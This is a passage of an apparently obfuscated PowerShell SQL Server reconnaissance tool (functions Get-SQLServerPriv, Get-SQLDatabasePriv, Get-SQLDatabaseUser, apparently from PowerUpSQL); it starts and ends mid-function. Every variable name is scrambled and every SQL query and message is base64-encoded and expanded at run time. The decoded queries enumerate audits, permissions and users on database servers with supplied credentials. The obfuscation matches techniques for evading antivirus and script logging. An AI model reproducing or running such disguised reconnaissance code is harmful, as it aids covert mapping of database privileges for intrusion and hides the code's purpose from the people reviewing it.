        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQASQBuAHMAdABhAG4AYwBlACcAIABhAHMAIABbAEkAbgBzAHQAYQBuAGMAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAdQBkAGkAdABfAGkAZAAgAGEAcwAgAFsAQQB1AGQAaQB0AEkAZABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBuAGEAbQBlACAAYQBzACAAWwBBAHUAZABpAHQATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBuAGEAbQBlACAAYQBzACAAWwBBAHUAZABpAHQAUwBwAGUAYwBpAGYAaQBjAGEAdABpAG8AbgBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGQALgBhAHUAZABpAHQAXwBhAGMAdABpAG8AbgBfAG4AYQBtAGUAIABhAHMAIABbAEEAdQBkAGkAdABBAGMAdABpAG8AbgBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBpAHMAXwBzAHQAYQB0AGUAXwBlAG4AYQBiAGwAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGQALgBpAHMAXwBnAHIAbwB1AHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZAAuAGEAdQBkAGkAdABfAGEAYwB0AGkAbwBuAF8AaQBkACAAYQBzACAAWwBBAHUAZABpAHQAQQBjAHQAaQBvAG4ASQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwAuAGMAcgBlAGEAdABlAF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAC4AbQBvAGQAaQBmAHkAXwBkAGEAdABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAcwB5AHMALgBzAGUAcgB2AGUAcgBfAGEAdQBkAGkAdABzACAAQQBTACAAYQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASgBPAEkATgAgAHMAeQBzAC4AcwBlAHIAdgBlAHIAXwBhAHUAZABpAHQAXwBzAHAAZQBjAGkAZgBpAGMAYQB0AGkAbwBuAHMAIABBAFMAIABzAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAE4AIABhAC4AYQB1AGQAaQB0AF8AZwB1AGkAZAAgAD0AIABzAC4AYQB1AGQAaQB0AF8AZwB1AGkAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASgBPAEkATgAgAHMAeQBzAC4AcwBlAHIAdgBlAHIAXwBhAHUAZABpAHQAXwBzAHAAZQBjAGkAZgBpAGMAYQB0AGkAbwBuAF8AZABlAHQAYQBpAGwAcwAgAEEAUwAgAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAHMALgBzAGUAcgB2AGUAcgBfAHMAcABlAGMAaQBmAGkAYwBhAHQAaQBvAG4AXwBpAGQAIAA9ACAAZAAuAHMAZQByAHYAZQByAF8AcwBwAGUAYwBpAGYAaQBjAGEAdABpAG8AbgBfAGkAZAAgAFcASABFAFIARQAgADEAPQAxAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwAvAD0APQBcAC8APQBcAF8AXwAvAFwAXwAvAFwALwA9AH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewAvAD0AXAAvAFwAXwBfAF8ALwBcAC8AXABfAF8AXwAvAD0AfQANAAoAIAAgACAAIAAgACAAIAAgACQAewBfAC8APQBcAF8AXwAvAFwAXwAvAD0APQA9AFwALwA9AFwAfQA=')))
        ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
        ${__/\/\_/=\/\/=\/\}  = ${__/\/\_/=\/\/=\/\}  + ${/=\_____/\/\/=\__}
    }
    End
    {
        ${__/\/\_/=\/\/=\/\}
    }
}
Function  Get-SQLServerPriv
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission name.')]
        [string]$PermissionName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/=\___/\/=\/\_/\} = New-Object -TypeName System.Data.DataTable
        if($PermissionName)
        {
            ${_/=\/=\____/==\/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABXAEgARQBSAEUAIABQAEUAUgAuAHAAZQByAG0AaQBzAHMAaQBvAG4AXwBuAGEAbQBlACAAbABpAGsAZQAgACcAJABQAGUAcgBtAGkAcwBzAGkAbwBuAE4AYQBtAGUAJwA=')))
        }
        else
        {
            ${_/=\/=\____/==\/=} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQASQBuAHMAdABhAG4AYwBlACcAIABhAHMAIABbAEkAbgBzAHQAYQBuAGMAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEcAUgBFAC4AbgBhAG0AZQAgAGEAcwAgAFsARwByAGEAbgB0AGUAZQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARwBSAE8ALgBuAGEAbQBlACAAYQBzACAAWwBHAHIAYQBuAHQAbwByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABQAEUAUgAuAGMAbABhAHMAcwBfAGQAZQBzAGMAIABhAHMAIABbAFAAZQByAG0AaQBzAHMAaQBvAG4AQwBsAGEAcwBzAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUABFAFIALgBwAGUAcgBtAGkAcwBzAGkAbwBuAF8AbgBhAG0AZQAgAGEAcwAgAFsAUABlAHIAbQBpAHMAcwBpAG8AbgBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUABFAFIALgBzAHQAYQB0AGUAXwBkAGUAcwBjACAAYQBzACAAWwBQAGUAcgBtAGkAcwBzAGkAbwBuAFMAdABhAHQAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMATwBBAEwARQBTAEMARQAoAFAAUgBDAC4AbgBhAG0AZQAsACAARQBQAC4AbgBhAG0AZQAsACAATgAnACcAKQAgAGEAcwAgAFsATwBiAGoAZQBjAHQATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMATwBBAEwARQBTAEMARQAoAFAAUgBDAC4AdAB5AHAAZQBfAGQAZQBzAGMALAAgAEUAUAAuAHQAeQBwAGUAXwBkAGUAcwBjACwAIABOACcAJwApACAAYQBzACAAWwBPAGIAagBlAGMAdABUAHkAcABlAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEYAUgBPAE0AIABbAHMAeQBzAF0ALgBbAHMAZQByAHYAZQByAF8AcABlAHIAbQBpAHMAcwBpAG8AbgBzAF0AIABhAHMAIABQAEUAUgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBOAE4ARQBSACAASgBPAEkATgAgAHMAeQBzAC4AcwBlAHIAdgBlAHIAXwBwAHIAaQBuAGMAaQBwAGEAbABzACAAYQBzACAARwBSAE8ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAFAARQBSAC4AZwByAGEAbgB0AG8AcgBfAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACAAPQAgAEcAUgBPAC4AcAByAGkAbgBjAGkAcABhAGwAXwBpAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkATgBOAEUAUgAgAEoATwBJAE4AIABzAHkAcwAuAHMAZQByAHYAZQByAF8AcAByAGkAbgBjAGkAcABhAGwAcwAgAGEAcwAgAEcAUgBFAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAE4AIABQAEUAUgAuAGcAcgBhAG4AdABlAGUAXwBwAHIAaQBuAGMAaQBwAGEAbABfAGkAZAAgAD0AIABHAFIARQAuAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABMAEUARgBUACAASgBPAEkATgAgAHMAeQBzAC4AcwBlAHIAdgBlAHIAXwBwAHIAaQBuAGMAaQBwAGEAbABzACAAYQBzACAAUABSAEMADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAFAARQBSAC4AYwBsAGEAcwBzACAAPQAgADEAMAAxACAAQQBOAEQAIABQAEUAUgAuAG0AYQBqAG8AcgBfAGkAZAAgAD0AIABQAFIAQwAuAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABMAEUARgBUACAASgBPAEkATgAgAHMAeQBzAC4AZQBuAGQAcABvAGkAbgB0AHMAIABBAFMAIABFAFAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAFAARQBSAC4AYwBsAGEAcwBzACAAPQAgADEAMAA1ACAAQQBOAEQAIABQAEUAUgAuAG0AYQBqAG8AcgBfAGkAZAAgAD0AIABFAFAALgBlAG4AZABwAG8AaQBuAHQAXwBpAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewBfAC8APQBcAC8APQBcAF8AXwBfAF8ALwA9AD0AXAAvAD0AfQANAAoAIAAgACAAIAAgACAAIAAgAE8AUgBEAEUAUgAgAEIAWQAgAEcAcgBhAG4AdABlAGUATgBhAG0AZQAsAFAAZQByAG0AaQBzAHMAaQBvAG4ATgBhAG0AZQA7AA==')))
        ${_/\/\_/=\__/\/==\} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${_/=\___/\/=\/\_/\} = ${_/=\___/\/=\/\_/\} + ${_/\/\_/=\__/\/==\}
    }
    End
    {
        ${_/=\___/\/=\/\_/\}
    }
}
Function  Get-SQLDatabasePriv
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name to filter for.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission name to filter for.')]
        [string]$PermissionName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission type to filter for.')]
        [string]$PermissionType,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name for grantee to filter for.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Don't select permissions for default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\_/==\/\/\_/=\_} = New-Object -TypeName System.Data.DataTable
        if($PermissionName)
        {
            ${_/=\/=\____/==\/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAHAAbQAuAHAAZQByAG0AaQBzAHMAaQBvAG4AXwBuAGEAbQBlACAAbABpAGsAZQAgACcAJABQAGUAcgBtAGkAcwBzAGkAbwBuAE4AYQBtAGUAJwA=')))
        }
        else
        {
            ${_/=\/=\____/==\/=} = ''
        }
        if($PrincipalName)
        {
            ${__/=\/\/===\__/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAHIAcAAuAG4AYQBtAGUAIABsAGkAawBlACAAJwAkAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAJwA=')))
        }
        else
        {
            ${__/=\/\/===\__/\/} = ''
        }
        if($PermissionType)
        {
            ${_/==\/===\_____/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAHAAbQAuAGMAbABhAHMAcwBfAGQAZQBzAGMAIABsAGkAawBlACAAJwAkAFAAZQByAG0AaQBzAHMAaQBvAG4AVAB5AHAAZQAnAA==')))
        }
        else
        {
            ${_/==\/===\_____/\} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAEkAbgBzAHQAYQBuAGMAZQAnACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ACcAIABhAHMAIABbAEQAYQB0AGEAYgBhAHMAZQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAByAHAALgBuAGEAbQBlACAAYQBzACAAWwBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAByAHAALgB0AHkAcABlAF8AZABlAHMAYwAgAGEAcwAgAFsAUAByAGkAbgBjAGkAcABhAGwAVAB5AHAAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcABtAC4AYwBsAGEAcwBzAF8AZABlAHMAYwAgAGEAcwAgAFsAUABlAHIAbQBpAHMAcwBpAG8AbgBUAHkAcABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAG0ALgBwAGUAcgBtAGkAcwBzAGkAbwBuAF8AbgBhAG0AZQAgAGEAcwAgAFsAUABlAHIAbQBpAHMAcwBpAG8AbgBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAG0ALgBzAHQAYQB0AGUAXwBkAGUAcwBjACAAYQBzACAAWwBTAHQAYQB0AGUARABlAHMAYwByAGkAcAB0AGkAbwBuAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAGIAagBlAGMAdABUAHkAcABlACAAPQAgAEMAQQBTAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwBIAEUATgAgAG8AYgBqAC4AdAB5AHAAZQBfAGQAZQBzAGMAIABJAFMAIABOAFUATABMAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8AUgAgAG8AYgBqAC4AdAB5AHAAZQBfAGQAZQBzAGMAIAA9ACAAJwBTAFkAUwBUAEUATQBfAFQAQQBCAEwARQAnACAAVABIAEUATgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAG0ALgBjAGwAYQBzAHMAXwBkAGUAcwBjAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATABTAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwBiAGoALgB0AHkAcABlAF8AZABlAHMAYwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAE4ARAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsATwBiAGoAZQBjAHQATgBhAG0AZQBdACAAPQAgAEkAcwBuAHUAbABsACgAcwBzAC4AbgBhAG0AZQAsACAATwBiAGoAZQBjAHQAXwBuAGEAbQBlACgAcABtAC4AbQBhAGoAbwByAF8AaQBkACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAIAAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQAuAHMAeQBzAC4AZABhAHQAYQBiAGEAcwBlAF8AcAByAGkAbgBjAGkAcABhAGwAcwAgAHIAcAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAE4ATgBFAFIAIABKAE8ASQBOACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9AC4AcwB5AHMALgBkAGEAdABhAGIAYQBzAGUAXwBwAGUAcgBtAGkAcwBzAGkAbwBuAHMAIABwAG0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATwBOACAAcABtAC4AZwByAGEAbgB0AGUAZQBfAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACAAPQAgAHIAcAAuAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEwARQBGAFQAIABKAE8ASQBOACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9AC4AcwB5AHMALgBzAGMAaABlAG0AYQBzACAAcwBzAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAHAAbQAuAG0AYQBqAG8AcgBfAGkAZAAgAD0AIABzAHMALgBzAGMAaABlAG0AYQBfAGkAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABMAEUARgBUACAASgBPAEkATgAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQAuAHMAeQBzAC4AbwBiAGoAZQBjAHQAcwAgAG8AYgBqAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAHAAbQAuAFsAbQBhAGoAbwByAF8AaQBkAF0AIAA9ACAAbwBiAGoALgBbAG8AYgBqAGUAYwB0AF8AaQBkAF0AIABXAEgARQBSAEUAIAAxAD0AMQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwAvAD0APQBcAC8APQA9AD0AXABfAF8AXwBfAF8ALwBcAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AF8ALwA9AFwALwA9AFwAXwBfAF8AXwAvAD0APQBcAC8APQB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwBfAC8APQBcAC8AXAAvAD0APQA9AFwAXwBfAC8AXAAvAH0A')))
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwByAGEAYgBiAGkAbgBnACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzACAAZgBvAHIAIAB0AGgAZQAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQAgAGQAYQB0AGEAYgBhAHMAZQAuAC4ALgA=')))
            }
            ${_/\/\/=\______/=\} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${_/\_/==\/\/\_/=\_} = ${_/\_/==\/\/\_/=\_} + ${_/\/\/=\______/=\}
        }
    }
    End
    {
        ${_/\_/==\/\/\_/=\_}
    }
}
Function  Get-SQLDatabaseUser
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database user.')]
        [string]$DatabaseUser,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Server login.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\/\/==\/\_/\/\/} = New-Object -TypeName System.Data.DataTable
        $null = ${_/\/\/==\/\_/\/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/\/\/==\/\_/\/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/\/\/==\/\_/\/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = ${_/\/\/==\/\_/\/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAFUAcwBlAHIASQBkAA=='))))
        $null = ${_/\/\/==\/\_/\/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAFUAcwBlAHIA'))))
        $null = ${_/\/\/==\/\_/\/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAUwBpAGQA'))))
        $null = ${_/\/\/==\/\_/\/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA='))))
        $null = ${_/\/\/==\/\_/\/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAVAB5AHAAZQA='))))
        $null = ${_/\/\/==\/\_/\/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGEAdQBsAHQAXwBzAGMAaABlAG0AYQBfAG4AYQBtAGUA'))))
        $null = ${_/\/\/==\/\_/\/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = ${_/\/\/==\/\_/\/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZgBpAHgAZQBkAF8AcgBvAGwAZQA='))))
        if($PrincipalName)
        {
            ${__/=\/\/===\__/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGIALgBuAGEAbQBlACAAbABpAGsAZQAgACcAJABQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlACcA')))
        }
        else
        {
            ${__/=\/\/===\__/\/} = ''
        }
        if($DatabaseUser)
        {
            ${_/\/\/\_/\/\_/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGEALgBuAGEAbQBlACAAbABpAGsAZQAgACcAJABEAGEAdABhAGIAYQBzAGUAVQBzAGUAcgAnAA==')))
        }
        else
        {
            ${_/\/\/\_/\/\_/\/\} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  -NoDefaults
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
